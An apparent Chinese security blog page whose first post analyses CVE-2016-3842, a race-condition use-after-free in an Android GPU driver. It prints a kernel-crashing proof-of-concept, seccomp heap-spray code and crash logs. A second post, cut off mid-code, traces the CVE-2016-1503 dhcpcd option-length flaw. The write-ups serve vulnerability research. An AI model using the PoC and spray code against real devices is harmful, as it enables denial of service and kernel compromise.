<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUMEM_ALLOC ，这个命令可以让用户去分配一块GPU共享内存。当一个线程调用这个ioctl之后，程序会创建一个kgsl_mem_entry的结构体用来描述一块已经分配好的内存。与此同时函数kgsl_mem_entry_attach_process会通过调用idr_alloc函数给kgsl_mem_entry分配一个ID。在这个时候，另外一个线程调用 IOCTL_KGSL_GPUMEM_FREE_ID 的ioctl命令去释放这个内存块，如果能在分配函数完成之前将这个kgsl_mem_entry释放掉，那么直接就造成了UAF了。</p>
<p>再来看一下官方介绍：<br>If we add the mem entry pointer in the process idr and rb tree too early, other threads can do operations on the entry by guessing the ID or GPU address before the object gets returned by the creating operation.</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>因为每在内核分配的第一个kgsl_mem_entry所分配的ID为1，所以可以准确释放刚分配好的内存块。<br>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">void kgsl2()&#123;</div><div class="line">  </div><div class="line">  int fd = open(&quot;/dev/kgsl-3d0&quot;,0);</div><div class="line">  </div><div class="line">  struct kgsl_gpumem_alloc arg;</div><div class="line">  struct kgsl_gpumem_free_id arg_free;</div><div class="line">  int ret = 0;</div><div class="line">  </div><div class="line">  arg.gpuaddr = 0x1000;</div><div class="line">  arg.size = 0x40;</div><div class="line">  arg.flags = 0x1000008;</div><div class="line">  </div><div class="line">  int pid = fork();</div><div class="line">  if(pid)&#123;</div><div class="line">      while(1)&#123;</div><div class="line">        arg_free.id = 1;</div><div class="line">        ioctl(fd,IOCTL_KGSL_GPUMEM_FREE_ID, &amp;arg_free);</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">    ret = ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC, &amp;arg);</div><div class="line">    if(ret)&#123;</div><div class="line">      perror(&quot;alloc&quot;);</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">&#125;</div><div class="line">  </div><div class="line">int main()&#123;</div><div class="line">    printf(&quot;******CVE-2016-3842******&quot; );</div><div class="line">    kgsl2();</div><div class="line"> </div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Crash-Log："><a href="#Crash-Log：" class="headerlink" title="Crash Log："></a>Crash Log：</h2><p>[ 4624.507633] Modules linked in:<br>[ 4624.507921] CPU: 0 PID: 7500 Comm: CVE-2016-3842 Tainted: G        W    3.10.73-g1bbb776-dirty #13<br>[ 4624.508026] task: ffffffc042c25600 ti: ffffffc03db7c000 task.ti: ffffffc03db7c000<br>[ 4624.508232] PC is at _raw_spin_lock+0x24/0x5c<br>[ 4624.508421] LR is at _raw_spin_lock+0x20/0x5c<br>[ 4624.508525] pc : [<ffffffc001005584>] lr : [<ffffffc001005580>] pstate: 60000145<br>[ 4624.508712] sp : ffffffc03db7fc30<br>[ 4624.508815] x29: ffffffc03db7fc30 x28: ffffffc03db7c000<br>[ 4624.509113] x27: 0000000000000044 x26: 0000000000000000<br>[ 4624.509494] x25: ffffffc001fe7e18 x24: 00000000c0000000<br>[ 4624.509787] x23: 0000000000000001 x22: ffffffc01d9e941c<br>[ 4624.510170] x21: 0000000000000000 x20: ffffffc001d91000<br>[ 4624.510467] x19: 000000000000001c x18: 0000000000000000<br>[ 4624.510855] x17: 0000000000000001 x16: ffffffc0003455f8<br>[ 4624.511156] x15: 0000007fa7426028 x14: 0000007fa7426018<br>[ 4624.511535] x13: 0000000000000003 x12: 0000000000000001<br>[ 4624.511830] x11: 0000000000000001 x10: 000000000000000d<br>[ 4624.512209] x9 : 000000000046dc68 x8 : 000000000000001d<br>[ 4624.512511] x7 : 0000000000000001 x6 : 0000000000000000<br>[ 4624.512807] x5 : 0000000000000000 x4 : 0000007fd7478a88<br>[ 4624.513190] x3 : 0000000000000000 x2 : 0000000000000000<br>[ 4624.513488] x1 : 00000000fe9223ab x0 : ffffffc001d49690<br>[ 4624.513867]<br>[ 4624.513972] Process CVE-2016-3842 (pid: 7500, stack limit = 0xffffffc03db7c058)<br>[ 4624.514158] Call trace:<br>[ 4624.514264] [<ffffffc001005584>] _raw_spin_lock+0x24/0x5c<br>[ 4624.514378] [<ffffffc000611504>] _sharedmem_free_entry+0x84/0x2a4<br>[ 4624.514570] [<ffffffc0006118b0>] kgsl_ioctl_gpumem_free_id+0x10c/0x12c<br>[ 4624.514677] [<ffffffc000617668>] kgsl_ioctl_helper+0x250/0x2ec<br>[ 4624.514865] [<ffffffc000617740>] kgsl_ioctl+0x3c/0x4c<br>[ 4624.514975] [<ffffffc000345520>] do_vfs_ioctl+0x4a4/0x57c<br>[ 4624.515163] [<ffffffc000345660>] SyS_ioctl+0x68/0x94<br>[ 4624.515271] Code: 97c822ff 52800020 97c94706 f9800271 (885ffe60)<br>[ 4624.515635] —[ end trace b6c5dfe1e97b62c8 ]—<br>[ 4624.583132] Kernel panic - not syncing: Fatal exception<br>[ 4624.583362] CPU1: stopping</ffffffc000345660></ffffffc000345520></ffffffc000617740></ffffffc000617668></ffffffc0006118b0></ffffffc000611504></ffffffc001005584></ffffffc001005580></ffffffc001005584></p>
<h2 id="实际堆喷中遇到的问题"><a href="#实际堆喷中遇到的问题" class="headerlink" title="实际堆喷中遇到的问题"></a>实际堆喷中遇到的问题</h2><h4 id="1-使用seccomp被拦截"><a href="#1-使用seccomp被拦截" class="headerlink" title="1.使用seccomp被拦截"></a>1.使用seccomp被拦截</h4><p>用的是seccomp这个syscall来进行堆喷，seccomp被拦截了，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ericky:CVE-2016-3842 heyao$ adb shell ./data/local/tmp/CVE-2016-3842</div><div class="line">prog.len:18</div><div class="line">prctl(SECCOMP): Permission denied</div></pre></td></tr></table></figure>
<p>在提示过后，查看android内核源码，发现并不需要任何权限，但是要在使用之前设置一个Admin的进程属性来绕过。</p>
<h4 id="2-堆喷如何判断是否成功"><a href="#2-堆喷如何判断是否成功" class="headerlink" title="2.堆喷如何判断是否成功"></a>2.堆喷如何判断是否成功</h4><p>调试漏洞时，选择自己能改内核代码的机器来调。printk就能直观显示是否成功。</p>
<p>还有相对高级的方法是，可以在喷的内容中做一些标记，比如deadbeef，这样喷上去之后在崩溃，crash寄存器中会有反馈。</p>
<p>建议优先用printk。</p>
<h4 id="3-崩溃日志的疑问"><a href="#3-崩溃日志的疑问" class="headerlink" title="3.崩溃日志的疑问"></a>3.崩溃日志的疑问</h4><p>按漏洞的原理来看，崩溃时候的函数应该是顺着IOCTL_KGSL_MAP_USER_MEM这个ioctl的，但是为什么崩溃信息里为什么会是这个函数导致崩溃的呢？看这个崩溃信息，让我有点迷糊了，不知道准确的触发时机是什么时候了，是不是在我的机器上就是这个函数触发的崩溃？<br><img src="http://img.blog.csdn.net/20170612223024471?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>ShenDi大神的说法是这样的， “触发时机是有2～3处的，这取决于free的时机，你没法控制这个时机，但是如果你能喷堆成功，就能保证这2～3个时机都不会崩溃。”后来经我的验证，是因为我用的是5X的机器，而他用的是6P，崩溃信息确实不一样。</p>
<h4 id="4-关于堆喷结构体sock-filter"><a href="#4-关于堆喷结构体sock-filter" class="headerlink" title="4.关于堆喷结构体sock_filter"></a>4.关于堆喷结构体sock_filter</h4><p>对于sock_filter，如果不加修饰的随便定义这个结构体去喷，虽然它也会被kmalloc，只不过之后校验参数的时候 会失败，然后会被free掉，这个值得注意。因为如果seccomp失败的话，调用一次和调用一万次是没有区别的，kmalloc会永远落在同一个object上。</p>
<p>了解了以上这些，就可以开始尝试堆喷了，堆喷代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">void *heap_spray_tid(void *args)&#123;</div><div class="line">     struct sock_filter filter[] = &#123;  </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">     &#125;;</div><div class="line">   struct sock_fprog prog = &#123;</div><div class="line">      .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),</div><div class="line">      .filter = filter,</div><div class="line">   &#125;;</div><div class="line">   if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) &#123;</div><div class="line">           printf(&quot;PR_SET_NO_NEW_PRIVS Failed......!\n&quot;);</div><div class="line">           return 1;</div><div class="line">       &#125;</div><div class="line"> </div><div class="line"> </div><div class="line">   for (; !heap_spray_done;) &#123;</div><div class="line"> </div><div class="line">    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)) &#123;</div><div class="line">           perror(&quot;prctl(SECCOMP)&quot;);</div><div class="line">         &#125;else&#123;</div><div class="line"> </div><div class="line">         &#125;</div><div class="line">   &#125;</div><div class="line">｝</div></pre></td></tr></table></figure>
<p>内核print堆喷信息如下：<br><img src="http://img.blog.csdn.net/20170612223146871?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>经过不断的尝试，最后堆喷成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[  127.245287] Unable to handle kernel paging request at virtual address 17fff000c</div><div class="line">[  127.245303] pgd = ffffffc050824000</div><div class="line">[  127.245308] [17fff000c] *pgd=0000000000000000</div><div class="line">[  127.245320] Internal error: Oops: 96000005 [#1] PREEMPT SMP</div><div class="line">[  127.245330] CPU: 0 PID: 5453 Comm: CVE-2016-3842 Tainted: G        W    3.10.73-g9b6596d #1</div><div class="line">[  127.245337] task: ffffffc0a9554080 ti: ffffffc050834000 task.ti: ffffffc050834000</div><div class="line">[  127.245350] PC is at msm_iommu_map_range+0x8c/0x344</div><div class="line">[  127.245356] LR is at msm_iommu_map_range+0x6c/0x344</div><div class="line">[  127.245361] pc : [&lt;ffffffc0009f7c40&gt;] lr : [&lt;ffffffc0009f7c20&gt;] pstate: 80000145</div><div class="line">[  127.245365] sp : ffffffc050837b60</div><div class="line">[  127.245370] x29: ffffffc050837b60 x28: ffffffc050834000 </div><div class="line">[  127.245378] x27: 0000000000000001 x26: 0000000000000000 </div><div class="line">[  127.245386] x25: ffffffc050837bf0 x24: 0000000000100000 </div><div class="line">[  127.245394] x23: 00000000e8000000 x22: ffffffc001afe000 </div><div class="line">[  127.245402] x21: 000000017fff0000 x20: ffffffc0b87a9580 </div><div class="line">[  127.245410] x19: 0000000000100000 x18: ffffffc050837968 </div><div class="line">[  127.245419] x17: 0000000000000001 x16: ffffffc000233af8 </div><div class="line">[  127.245427] x15: 0000000000000000 x14: 0ffffffffffffffe </div><div class="line">[  127.245435] x13: 0000000000000030 x12: 0101010101010101 </div><div class="line">[  127.245443] x11: 7f7f7f7f7f7f7f7f x10: 7757597353435251 </div><div class="line">[  127.245451] x9 : ffffffc050837890 x8 : 001d1649d2b64000 </div><div class="line">[  127.245459] x7 : 0000000000000018 x6 : ffffffc0009f7bb4 </div><div class="line">[  127.245468] x5 : ffffffc0b87a9580 x4 : 0000000000000000 </div><div class="line">[  127.245475] x3 : 0000000000000000 x2 : ffffffc0b9e63418 </div><div class="line">[  127.245484] x1 : ffffffc0b9ebc818 x0 : 0000000000000012 </div><div class="line"> </div><div class="line">struct sock_filter filter[] = &#123;  </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">      &#125;;</div><div class="line">#define         BPF_RET         0x06</div><div class="line">#define         BPF_K           0x00</div><div class="line">#define SECCOMP_RET_ALLOW  0x7fff0000U /* allow */</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>折腾了很久，终于堆喷成功。多看代码，多尝试，多坚持。</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/06/06/CVE-2016-1503 漏洞分析/">
  <time datetime="2016-06-06T04:23:00.000Z">
    2016-06-06
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/06/06/CVE-2016-1503 漏洞分析/">CVE-2016-1503 漏洞分析</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="CVE-2016-1503-漏洞分析"><a href="#CVE-2016-1503-漏洞分析" class="headerlink" title="CVE-2016-1503 漏洞分析"></a>CVE-2016-1503 漏洞分析</h1><h2 id="一、漏洞成因"><a href="#一、漏洞成因" class="headerlink" title="一、漏洞成因"></a>一、漏洞成因</h2><p>首先来看一下官方的描述：<br>    “A vulnerability in the Dynamic Host Configuration Protocol service could enable an attacker to cause memory corruption, which could lead to remote code execution.”<br>    攻击者可能会通过动态主机配置协议服务中的漏洞破坏内存，从而执行远程代码。</p>
<p>Diff：<br><img src="http://img.blog.csdn.net/20170116120936119?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>从官方打下的Patch来看，主要的区别是一个连续的if语句改成了互斥的if else语句，另外一个关键就是之前可以返回除了0或者-1之外的其他值，而patch之后只能返回0或者-1.<br>    通过以上的分析，可以确定了具体的漏洞原因就是dhcpcd在解析options的时候长度dl的校验出现了问题，导致了后续的远程执行漏洞。</p>
<h2 id="二、函数追踪"><a href="#二、函数追踪" class="headerlink" title="二、函数追踪"></a>二、函数追踪</h2><pre><code>定位一下该patch的地方可以得知该Patch的位置在文件dhcp.c中的valid_length(uint8_t option, int dl, int *type)函数里，查找一下valid_length 的引用有一处,是在文件dhcp.c中的get_option(const struct dhcp_message *dhcp, uint8_t opt, int *len, int *type)函数，如下：
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">get_option(const struct dhcp_message *dhcp, uint8_t opt, int *len, int *type)</div><div class="line">&#123;</div><div class="line">	const uint8_t *p = dhcp-&gt;options;</div><div class="line">	const uint8_t *e = p + sizeof(dhcp-&gt;options);</div><div class="line">	uint8_t l, ol = 0;</div><div class="line">	uint8_t o = 0;</div><div class="line">	uint8_t overl = 0;</div><div class="line">	uint8_t *bp = NULL;</div><div class="line">	const uint8_t *op = NULL;</div><div class="line">	int bl = 0;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line"></div><div class="line">	if (valid_length(opt, bl, type) == -1) &#123;</div><div class="line">		errno = EINVAL;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line">	if (len)</div><div class="line">		*len = bl;</div><div class="line">	if (bp) &#123;</div><div class="line">		memcpy(bp, op, ol);</div><div class="line">		return (const uint8_t *)opt_buffer;</div><div class="line">	&#125;</div><div class="line">	if (op)</div><div class="line">		return op;</div><div class="line">	errno = ENOENT;</div><div class="line">	return NULL;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从代码可以看到，只要返回值不为-1，即可通过options的长度校验，也就是说，只要dl % sz 不等于-1即可。sz是根据option的类型来确定，根据不同的类型来取不同的值，如果是UINT32，sz则为4；如果是UINT16，sz则为2，如果是UINIT8，sz则为1。而在valid_length函数中的dl其实就是get_option函数中的bl，这个值是服务器发出来的数据包中单个option的长度。在校验完bl的长度后，将会把这个bl的值赋给get_option函数中的第三个参数<em>len。<br>    接下来我们继续追踪这个指针len，查找get_option函数的引用，在dhcp.c文件中一共有7处，排除之后找到configure_env(char **env, const char </em>prefix, const struct dhcp_message <em>dhcp, const struct if_options </em>ifo)函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">configure_env(char **env, const char *prefix, const struct dhcp_message *dhcp,</div><div class="line">    const struct if_options *ifo)</div><div class="line">&#123;</div><div class="line">	unsigned int i;</div><div class="line">	const uint8_t *p;</div><div class="line">	int pl;</div><div class="line">	struct in_addr addr;</div><div class="line">	struct in_addr net;</div><div class="line">	struct in_addr brd;</div><div class="line">	char *val, *v;</div><div class="line">	const struct dhcp_opt *opt;</div><div class="line">	ssize_t len, e = 0;</div><div class="line">	char **ep;</div><div class="line">	char cidr[4];</div><div class="line">	uint8_t overl = 0;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line">	//循环读取options</div><div class="line">	for (opt = dhcp_opts; opt-&gt;option; opt++) &#123;</div><div class="line">		if (!opt-&gt;var)</div><div class="line">			continue;</div><div class="line">		if (has_option_mask(ifo-&gt;nomask, opt-&gt;option))</div><div class="line">			continue;</div><div class="line">		val = NULL;</div><div class="line">		p = get_option(dhcp, opt-&gt;option, &amp;pl, NULL);</div><div class="line">		if (!p)</div><div class="line">			continue;</div><div class="line">		/* We only want the FQDN name */</div><div class="line">		if (opt-&gt;option == DHO_FQDN) &#123;</div><div class="line">			p += 3;</div><div class="line">			pl -= 3;</div><div class="line">		&#125;</div><div class="line">		len = print_option(NULL, 0, opt-&gt;type, pl, p);</div><div class="line">		if (len &lt; 0)</div><div class="line">			return -1;</div><div class="line">		e = strlen(prefix) + strlen(opt-&gt;var) + len + 4;</div><div class="line">		v = val = *ep++ = xmalloc(e);</div><div class="line">		v += snprintf(val, e, &quot;%s_%s=&quot;, prefix, opt-&gt;var);</div><div class="line">		if (len != 0)</div><div class="line">			print_option(v, len, opt-&gt;type, pl, p);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return ep - env;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从以上代码可以看到，之前的校验出现了问题的bl，其实赋值给了pl，而pl在configure_env函数中为一个局部变量，在调用get_option 函数给pl赋值后，后来又2次调用print_option函数，并传入了pl参数。接下来就是来跟踪一下这个pl的值，查看print_option(char <em>s, ssize_t len, int type, int dl, const uint8_t </em>data)函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">print_option(char *s, ssize_t len, int type, int dl, const uint8_t *data)</div><div class="line">&#123;</div><div class="line">	const uint8_t *e, *t;</div><div class="line">	uint16_t u16;</div><div class="line">	int16_t s16;</div><div class="line">	uint32_t u32;</div><div class="line">	int32_t s32;</div><div class="line">	struct in_addr addr;</div><div class="line">	ssize_t bytes = 0;</div><div class="line">	ssize_t l;</div><div class="line">	char *tmp;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line"></div><div class="line">	if (!s) &#123;</div><div class="line">		if (type &amp; UINT8)</div><div class="line">			l = 3;</div><div class="line">		else if (type &amp; UINT16) &#123;</div><div class="line">			l = 5;</div><div class="line">			dl /= 2;</div><div class="line">		&#125; else if (type &amp; SINT16) &#123;</div><div class="line">			l = 6;</div><div class="line">			dl /= 2;</div><div class="line">		&#125; else if (type &amp; UINT32) &#123;</div><div class="line">			l = 10;</div><div class="line">			dl /= 4;</div><div class="line">		&#125; else if (type &amp; SINT32) &#123;</div><div class="line">			l = 11;</div><div class="line">			dl /= 4;</div><div class="line">		&#125; else if (type &amp; IPV4) &#123;</div><div class="line">			l = 16;</div><div class="line">			dl /= 4;</div><div class="line">		&#125; else &#123;</div><div class="line">			errno = EINVAL;</div><div class="line">			return -1;</div><div class="line">		&#125;</div><div class="line">		return (l + 1) * dl; //第一次调用 print_option在这里返回</div><div class="line">	&#125;</div><div class="line">//第二次调用 print_option函数才可以到这里</div><div class="line">	t = data;</div><div class="line">	e = data + dl;</div><div class="line">	while (data &lt; e) &#123;</div><div class="line">		if (data != t) &#123;</div><div class="line">			*s++ = &apos; &apos;;</div><div class="line">			bytes++;</div><div class="line">			len--;</div><div class="line">		&#125;</div><div class="line">		if (type &amp; UINT8) &#123;</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, *data);</div><div class="line">			data++;</div><div class="line">		&#125; else if (type &amp; UINT16) &#123;</div><div class="line">			memcpy(&amp;u16, data, sizeof(u16));</div><div class="line">			u16 = ntohs(u16);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, u16);</div><div class="line">			data += sizeof(u16);</div><div class="line">		&#125; else if (type &amp; SINT16) &#123;</div><div class="line">			memcpy(&amp;s16, data, sizeof(s16));</div><div class="line">			s16 = ntohs(s16);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, s16);</div><div class="line">			data += sizeof(s16);</div><div class="line">		&#125; else if (type &amp; UINT32) &#123;</div><div class="line">			memcpy(&amp;u32, data, sizeof(u32));</div><div class="line">			u32 = ntohl(u32);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, u32);</div><div class="line">			data += sizeof(u32);</div><div class="line">		&#125; else if (type &amp; SINT32) &#123;</div><div class="line">			